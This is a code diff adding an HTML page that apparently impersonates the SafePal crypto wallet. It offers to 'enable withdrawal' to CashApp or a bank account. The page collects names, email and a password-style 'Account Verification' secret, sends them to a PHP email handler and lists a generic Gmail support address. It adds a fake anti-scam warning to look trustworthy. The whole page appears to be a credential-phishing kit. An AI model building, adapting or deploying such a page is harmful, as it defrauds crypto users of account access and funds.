@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enable Withdrawal</title>
+    <script src="https://kit.fontawesome.com/2f8df1a2ea.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="./assets/css/index.css">
+    <link rel="icon" href="./assets/images/safefavicon.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/light.css">
+</head>
+<body class="enablebody">
+    <nav class="safemobilenav" style="background-color: rgb(184,169,252);">
+        <a href="index.html"><img src="./assets/images/full-safepal-logo.png" alt="logo" class="downloadenable" width="120px"></a>
+        <a href="mailto:safepalservicescustom@gmail.com"></a>
+        <a href="https://safepal.com/en/download"><i class="fa-solid fa-download downloadenable"></i></a>
+        <a href="#enablewithdrawal"><i class="fa-solid fa-bars downloadenable"></i></a>
+    </nav>
+    <hr>
+    <div class="enablewithdrawal">
+        <i class="fa-brands fa-bitcoin"></i>
+        <h2>ENABLE WITHRAWAL IN SIMPLE STEPS</h2>
+    </div>
+       <div class="paragraphonenable">
+        <p>Complete the fields below to receive directions on how to enable withdrawal to your <span class="cashapp">CashApp account</span> or any other assets-friendly bank account.</p>
+       </div>
+        <div class="formfield">
+            <form action="email_handler.php" method="POST" onsubmit="savedata()">
+               <div class="info">
+                <label for="Firstname">First Name:</label>
+                <input type="text" placeholder="John" required name="first_name" id="Firstname">
+               </div>
+                <div class="info">
+                <label for="Lastname">Last Name:</label>
+                <input type="text" placeholder="Doe" required name="last_name" id="Lastname">
+                </div>
+                <div class="info">
+                <label for="Email">Email Address:</label>
+                <input type="email" placeholder="example@gmail.com" required name="email" id="emailaddress">
+                </div>
+                <div class="info">
+                <label for="AccountVerification">Account Verification:</label>
+                <input type="password" placeholder="SPuserID" required name="AccountVerification" id="AccountVerification">
+                </div>
+                <button type="submit">Enable Withdrawal</button>
+                <input type="hidden" name="_redirect" value="send">
+            </form>
+        </div>
+        <div class="enablenotes">
+            <p class="enablenote">Enable withdrawals now, and take charge of your money with ease. Enjoy the convenience and security of accessing your finances whenever you need them.</p>
+            <hr class="footerhrenable">
+        <p >
+            <i class="fa-solid fa-circle-exclamation"></i>Do NOT send funds to anyone claiming to be an agent from SafePal, they are scammers! <br><br>
+            <i class="fa-solid fa-circle-exclamation"></i>SafePal will never ask you for your account's passcode. 
+        </p>
+        </div>
+    </body>
+    </html>
+    <script src="./index.js"></script>
+</body>
+</html>
